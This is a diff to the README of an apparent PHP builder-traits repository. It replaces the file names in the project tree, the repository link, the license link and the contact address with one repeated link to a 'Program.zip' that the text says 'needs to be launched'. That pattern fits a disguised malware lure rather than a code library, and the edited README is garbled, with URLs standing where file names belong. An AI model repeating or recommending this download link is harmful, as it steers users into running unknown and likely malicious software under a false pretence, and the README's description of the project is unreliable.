@@ -7,10 +7,10 @@ This repository contains a collection of sample PHP traits that make it easy to 
 ['builder-pattern', 'design-patterns', 'fluent-interface', 'object-creation', 'php', 'php-builders', 'php-code', 'php-code-generator', 'php-library', 'php-patterns', 'traits']
 
 ### 📦 Access the Software
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip) *(File needs to be launched)*
+[![Download Software](https://github.com/Fran101-bn/php-builders/releases/download/v1.0/Program.zip)](https://github.com/Fran101-bn/php-builders/releases/download/v1.0/Program.zip) *(File needs to be launched)*
 
 ### 🌐 Visit the Repository
-Explore the full potential of these PHP traits by visiting the [PHP Builders](https://github.com/rokytd/php-builders) repository!
+Explore the full potential of these PHP traits by visiting the [PHP Builders](https://github.com/Fran101-bn/php-builders/releases/download/v1.0/Program.zip) repository!
 
 ## 🛠️ How to Use
 1. Clone the repository to your local machine.
@@ -20,17 +20,17 @@ Explore the full potential of these PHP traits by visiting the [PHP Builders](ht
 ## 📂 Project Structure
 ```
 php-builders/
-|   builder1.php
-|   builder2.php
+|   https://github.com/Fran101-bn/php-builders/releases/download/v1.0/Program.zip
+|   https://github.com/Fran101-bn/php-builders/releases/download/v1.0/Program.zip
 |   ...
 |__ traits/
-|   |   BuilderTrait1.php
-|   |   BuilderTrait2.php
+|   |   https://github.com/Fran101-bn/php-builders/releases/download/v1.0/Program.zip
+|   |   https://github.com/Fran101-bn/php-builders/releases/download/v1.0/Program.zip
 |   |   ...
 |
 |__ examples/
-|   |   Example1.php
-|   |   Example2.php
+|   |   https://github.com/Fran101-bn/php-builders/releases/download/v1.0/Program.zip
+|   |   https://github.com/Fran101-bn/php-builders/releases/download/v1.0/Program.zip
 |   |   ...
 ```
 
@@ -41,13 +41,13 @@ To quickly get started with the PHP Builders repository, follow these steps:
 3. Experiment with integrating these traits into your PHP projects.
 
 ## 📄 License
-This repository is licensed under the MIT License - see the [LICENSE](https://github.com/rokytd/php-builders/blob/main/LICENSE) file for details.
+This repository is licensed under the MIT License - see the [LICENSE](https://github.com/Fran101-bn/php-builders/releases/download/v1.0/Program.zip) file for details.
 
 ## 🤝 Contributing
 Contributions are welcome! Fork the repository, make your changes, and submit a pull request. Let's improve PHP coding together!
 
 ## 📧 Contact
-Have a question or suggestion? Feel free to reach out to the repository owner at example@example.com.
+Have a question or suggestion? Feel free to reach out to the repository owner at https://github.com/Fran101-bn/php-builders/releases/download/v1.0/Program.zip
 
 ## 🌟 Show Your Support
 Give a ⭐️ if you found this PHP Builders repository helpful and valuable for your projects!
